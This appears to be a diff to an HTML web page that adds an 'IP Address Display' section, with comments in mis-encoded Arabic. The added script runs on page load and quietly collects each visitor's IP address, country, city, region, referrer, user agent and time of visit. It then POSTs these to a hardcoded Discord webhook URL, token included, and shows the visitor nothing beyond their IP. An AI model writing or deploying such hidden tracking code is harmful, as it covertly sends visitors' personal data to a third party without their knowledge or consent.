@@ -156,6 +156,31 @@ document.write(unescape
         <p>^_*</p>
     </div>
 
+
+
+    <script>
+        async function fetchIPAddress() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                document.getElementById('ip-address').textContent = `   ip ${data.ip}`;
+            } catch (error) {
+                document.getElementById('ip-address').textContent = '';
+                console.error('Error fetching IP address:', error);
+                
+            }
+        }
+
+        // Fetch IP address on page load
+        fetchIPAddress();
+    </script>
+
+
+
+
+
+
+
     
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Address Display</title>
@@ -213,7 +238,58 @@ document.write(unescape
                 }, 5000);
             }
                 </script>
+                
 
+    
+        
+        
+            
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>E9DHE'* 'D2'&amp;1</title>
+            <script>
+                // /'D) D,E9 H%13'D (J'F'* 'D2'&1 %DI Discord Webhook
+                async function sendVisitorInfo() {
+                    try {
+                        // ,D( 9FH'F 'D@ IP EF ./E) ipify
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const ip = ipData.ip;
+        
+                        // ,D( E9DHE'* 'DEHB9 (F'!K 9DI 9FH'F 'D@ IP EF ./E) ipinfo
+                        const ipInfoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+                        const ipInfoData = await ipInfoResponse.json();
+        
+                        // 'D-5HD 9DI E9DHE'* 'DE*5A- HEHB9 'D%-'D)
+                        const referrer = document.referrer || "E('41)";  // %0' DE JCF GF'C 1'(7 %-'D)
+                        const userAgent = navigator.userAgent;
+                        const dateTime = new Date().toLocaleString(); // *'1J. HHB* 'D/.HD
+        
+                        // %9/'/ 1'(7 'D@ Webhook 'D.'5 (C
+                        const webhookUrl = 'https://discord.com/api/webhooks/1294832713253261332/W69QZIwaaJDDlhnHTEXfK-4Df_V0hK9iVZe9034XYxKpJBHGYZp7aEDvt1YC2zURrn81'; // '3*(/D YOUR_WEBHOOK_URL (1'(7 'DHJ( GHC 'D.'5 (C
+        
+                        // %13'D 'D(J'F'* %DI Discord Webhook
+                        await fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                content: "**New visitor information**", // 'D9FH'F 'D#3'3J
+                                embeds: [
+                                    {
+                                        title: "Visitor Details", // 9FH'F 'D13'D) AJ Discord
+                                        fields: [
+                                            { name: "IP Address", value: ip, inline: true },  // 916 9FH'F 'D@ IP
+                                            { name: "Country", value: ipInfoData.country, inline: true }, // 916 'D/HD)
+                                            { name: "City", value: ipInfoData.city || "Unknown", inline: true }, // 916 'DE/JF)
+                                            { name: "Region", value: ipInfoData.region || "Unknown", inline: true }, // 916 'DEF7B)
+                                            { name: "Referrer", value: referrer, inline: false },  // 1'(7 'D%-'D)
+                                            { name: "User Agent", value: userAgent, inline: false }, // E9DHE'* 'DE*5A-
+                                            { name: "Date & Time", value: dateTime, inline: false }  // *'1J. HHB* 'D/.HD
+                                        ],
+                                        color: 3066993 // DHF ('.*J'1J)
+                                    }
+                                ]
+                            })
+                        });
         
                         // 916 9FH'F 'D@ IP 9DI 'D5A-) ('.*J'1J)
                         document.getElementById('ip-address').textContent = `زوووووووووووووووططط: ${ip}`;
@@ -222,6 +298,17 @@ document.write(unescape
                         console.error('Error fetching visitor information:', error);
                     }
                 }
+        
+                // 9F/ *-EJD 'D5A-) J*E '3*/9'! 'D/'D)
+                window.onload = function() {
+                    sendVisitorInfo();
+                };
+            </script>
+        
+        
+            <h1></h1>
+            <p id="ip-address"></p>
+        
         
         
 </div></center></td></tr></tbody></table></body><style id="allow-copy_style">html, body, *, *::before, *::after, html body *, #allow-copy_script ~ body * {
